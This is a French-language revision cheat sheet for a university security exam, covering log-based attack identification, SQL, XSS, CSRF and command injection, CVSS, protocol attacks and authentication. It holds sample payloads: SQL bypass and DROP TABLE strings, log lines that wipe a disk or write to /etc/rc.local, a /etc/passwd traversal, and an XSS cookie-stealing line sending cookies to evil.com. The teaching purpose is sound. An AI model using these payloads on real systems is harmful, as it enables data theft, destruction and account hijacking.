# Cheat Sheet -- Vulnerabilites et Securite informatique

> Fiche de revision rapide pour le DS (2h, documents autorises)
> Structure basee sur les annales 2020-2021 et 2025

---

## Structure typique du DS

| Partie | Sujet | Points (indicatif) |
|--------|-------|---------------------|
| Partie Olivier | Qualifier des attaques (logs) | ~4 pts |
| Partie Olivier | Injection SQL ou commande | ~2-4 pts |
| Partie Olivier | Scenario IoT / vulnerabilites CVSS | ~4 pts |
| Partie Barbara | Cryptographie / protocole | ~4-6 pts |
| Partie Barbara | Authentification / proprietes | ~2-4 pts |

---

## 1. Identifier le type d'attaque dans un log

### Methode rapide

```
Voir <script>, alert(, <img onerror, <SCRipt>         --> XSS
Voir UNION, SELECT, OR 1=1, '--, ' OR '               --> SQL
Voir ;, |, ||, &&, `cmd`, $(cmd), /bin/, /etc/         --> CMD
Voir URL d'action sur un param sans token/nonce        --> CSRF
Rien de malicieux, exploration normale                 --> INFO
```

### Exemples cles

| Log | Type |
|-----|------|
| `/search="<SCRipt>alert(42)</SCRipt>"` | XSS |
| `/stuff.php?id=42 UNION SELECT 1,1,null --` | SQL |
| `/test.php?traceroute="\|\| echo reboot > /etc/rc.local"` | CMD |
| `/dostuff.php?dir=; dd if=/dev/urandom of=/dev/sda` | CMD |
| `/login.php?user=Johnny' or 'b' = 'b` | SQL |
| `/set.php?WifiKey=ABC123` | CSRF |
| `/../../../../../../etc/passwd` | INFO (path traversal) |
| `/scripts/admin.php.bak` | INFO |

---

## 2. Injection SQL -- aide-memoire

### Payloads classiques

| Objectif | Payload |
|----------|---------|
| Bypass login | `admin'--` |
| Bypass login (sans connaitre le login) | `' OR 1=1--` |
| Variante sans commentaire | `' OR 'a'='a` |
| Extraire d'autres tables | `0' UNION SELECT col1,col2,... FROM table--` |
| Enchainer des requetes | `'; DROP TABLE users--` |
| Champ numerique | `0 OR 1=1` (pas d'apostrophe) |

### Protections (par ordre de preference)

1. Framework / ORM (Django, Rails, Laravel)
2. Requetes preparees (`bind_param`)
3. Echapper + guillemets (`mysqli_real_escape_string`)
4. Forcer le type (`settype`, `sprintf %d`)
5. Whitelist

### Phrase cle : "Never trust an input!"

---

## 3. XSS -- aide-memoire

### Types

| Type | Ou est le code | Qui est touche |
|------|---------------|----------------|
| Reflete | Dans l'URL/requete | Celui qui clique sur le lien |
| Stocke | En base de donnees | Tous les visiteurs |
| DOM-based | Cote client | Depend du contexte |

### Exploitation

```
Vol de cookie :
<img src="0" onerror="window.location='http://evil.com/get.php?c='+document.cookie;">

Chargement de script :
<SCRIPT SRC=http://evil.com/evil.js></SCRIPT>
```

### Protections

| Protection | Comment |
|-----------|---------|
| Echapper les sorties | `&lt;` `&gt;` `&amp;` `&quot;` `&#x27;` |
| PHP | `htmlspecialchars($val, ENT_QUOTES)` |
| CSP | `Content-Security-Policy: script-src 'self'` |
| Cookie | `Set-Cookie: ...; HttpOnly; Secure; SameSite=Strict` |

### Phrase cle : "Never trust an output!"

---

## 4. CSRF -- aide-memoire

### Mecanisme

La victime est authentifiee. L'attaquant forge une requete (GET ou POST) que le navigateur de la victime execute automatiquement.

### Protections

1. `SameSite=Strict` sur les cookies d'authentification
2. Token anti-CSRF (valeur aleatoire dans chaque formulaire)

---

## 5. Injection de commandes -- aide-memoire

### Separateurs dangereux

`;`  `|`  `||`  `&&`  `` `cmd` ``  `$(cmd)`  `\n`

### Protections

1. Eviter les appels OS (fonctions natives)
2. Whitelist (regex : `^([0-9]{1,3}\.){3}[0-9]{1,3}$`)
3. Encoder/echapper

---

## 6. CVSS -- aide-memoire

### Echelle

| Score | Niveau |
|-------|--------|
| 0-3.9 | LOW |
| 4.0-6.9 | MEDIUM |
| 7.0-8.9 | HIGH |
| 9.0-10.0 | CRITICAL |

### Metriques principales (v3.1)

| Metrique | Valeurs | Explication |
|----------|---------|-------------|
| AV (Attack Vector) | N, A, L, P | Network > Adjacent > Local > Physical |
| AC (Attack Complexity) | L, H | Low = plus facile = plus grave |
| PR (Privileges Required) | N, L, H | None = plus grave |
| UI (User Interaction) | N, R | None = plus grave |
| C/I/A (Impact) | N, L, H | High = plus grave |

### Exemples

```
Heartbleed : AV:N/AC:L/PR:N/UI:N --> Reseau, facile, aucun privilege = HIGH/CRITICAL
CSRF typique : AV:N/AC:L/PR:N/UI:R --> Requiert interaction utilisateur = MEDIUM
```

---

## 7. Triade CIA -- aide-memoire

| Propriete | Violation typique |
|-----------|------------------|
| **C** (Confidentialite) | Vol de donnees, lecture non autorisee |
| **I** (Integrite) | Modification de donnees, defacement |
| **D** (Disponibilite) | DDoS, crash, deni de service |

---

## 8. Protocoles et MitM -- aide-memoire

### Notations

```
pk(i)       cle publique de i
sk(i)       cle privee de i
{m}pk(i)    chiffrement asymetrique
{m}k        chiffrement symetrique
h(m)        hash
nonce n     nombre aleatoire unique
```

### NSPK vs NSPKL

| | NSPK (vulnerable) | NSPKL (corrige) |
|---|---|---|
| Message 2 | `{(n, m)}pk(i)` | `{(n, m, r)}pk(i)` |
| MitM possible ? | OUI | NON |
| Difference | Pas d'identite de r | Identite de r ajoutee |

### Attaque de Lowe (resume)

Eve initie session avec Bob, relaie vers Alice. Alice croit parler a Bob. Corrige en ajoutant `r` dans le message 2.

---

## 9. Authentification -- aide-memoire

### Hierarchie (du plus faible au plus fort)

```
Weak aliveness < Weak aliveness (correct role) < Non-inj. agreement < Non-inj. synchronization
```

### Attaques typiques

| Attaque | Description | Contre-mesure |
|---------|------------|---------------|
| Miroir | Renvoyer un message a son emetteur | Signatures |
| Rejeu | Rejouer un ancien message | Nonces frais |
| MitM | Relayer entre deux sessions | Identite dans les messages |

---

## 10. Securite Cloud -- aide-memoire

### Points cles pour le DS

- **IaaS/PaaS/SaaS** : responsabilites differentes
- **Multitenancy** : canaux auxiliaires (cache, deduplication)
- **Images** : toujours mettre a jour
- **Interface web** : risques XSS, preferer l'API
- **Chiffrement** : au repos, en transit, homomorphe (lent)
- **IAM** : gestion des identites et droits d'acces

---

## 11. Mots de passe -- aide-memoire

- Stockage : TOUJOURS hash sale, JAMAIS en clair
- Top 1 mondial : `123456` (37M occurrences)
- Outils de cracking : hashcat, John the Ripper
- 72% crackables en 10^12 essais avec des regles entrainees
- haveibeenpwned.com : verifier si un mot de passe a fuite

---

## 12. Formules et definitions pour le DS

### Kerckhoffs

> Pas de securite par l'obscurite. La securite repose sur le secret de la cle, pas de l'algorithme.

### Dolev-Yao

> Cryptographie parfaite + controle total du reseau par l'attaquant (intercepter, bloquer, inserer, modifier).

### Hypothese de cryptographie parfaite

> Sans la cle, impossible de dechiffrer. Sans le message, impossible de retrouver le clair depuis le hash.

---

## 13. Checklist avant de rendre sa copie

- [ ] Pour chaque question d'identification d'attaque : UN SEUL type par ligne
- [ ] Pour les injections SQL : verifier si le champ est string (apostrophe) ou numerique (pas d'apostrophe)
- [ ] Pour les CVSS : ne pas oublier le vecteur d'attaque (AV) et l'interaction utilisateur (UI)
- [ ] Pour les protocoles : dessiner le MSC complet avec les connaissances initiales
- [ ] Pour les proprietes de securite : preciser le ROLE concerne (i ou r)
- [ ] Pour les attaques MitM : montrer les DEUX sessions paralleles
- [ ] Justifier chaque reponse (pas juste "oui" ou "non")
